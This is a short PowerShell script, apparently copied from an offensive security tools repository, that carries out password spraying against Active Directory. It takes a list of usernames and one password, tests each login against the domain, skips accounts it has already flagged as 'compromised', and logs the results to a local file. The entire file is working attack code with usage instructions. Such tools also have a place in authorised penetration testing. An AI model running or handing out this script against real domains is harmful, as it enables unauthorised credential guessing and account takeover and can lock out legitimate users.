#
# Original script:
# https://raw.githubusercontent.com/InfosecMatter/Minimalistic-offensive-security-tools/master/adlogin.ps1
#
<#
.SYNOPSIS
To use please import as module: Import-Module .\adlogin.ps1
#>

Function adcheck {
  param($u,$p)
  (new-object directoryservices.directoryentry "",$u,$p).psbase.name -ne $null
}
 
Function adlogin {
  param($userlist,$domain,$pswd)

  if (!$pswd) {
    Write-Host "usage: adlogin <userlist.txt> <domain> <password>"
    Write-Host " e.g.: adlogin users.txt domain.com P@ssw0rd"
    return
  }

  $date = Get-Date -Format "dd-MM-yyyy"
  $results = ".\passspray-$domain-$date.txt"
  $isValidFile = [System.IO.File]::Exists($results)

  if ($isValidFile -eq $false) {
    New-Item -Path $results -ItemType File -ErrorAction SilentlyContinue > $null
  }

  foreach($line in gc $userlist) {
    $x = (gc $results -EA SilentlyContinue | sls "^$line,.*,True$")
    if ($x) {
      Write-Host "user $line already compromised"
      continue
    }
    $x = (gc $results | sls -CaseSensitive "^$line,$pswd,")
    if ($x) {
      Write-Host "user $line with $pswd already tried"
      continue
    }
    $output = "$line,$pswd,"
    $output += adcheck "$domain\$line" "$pswd"
    Write-Host "$output"
    echo $output >>$results
  }
}

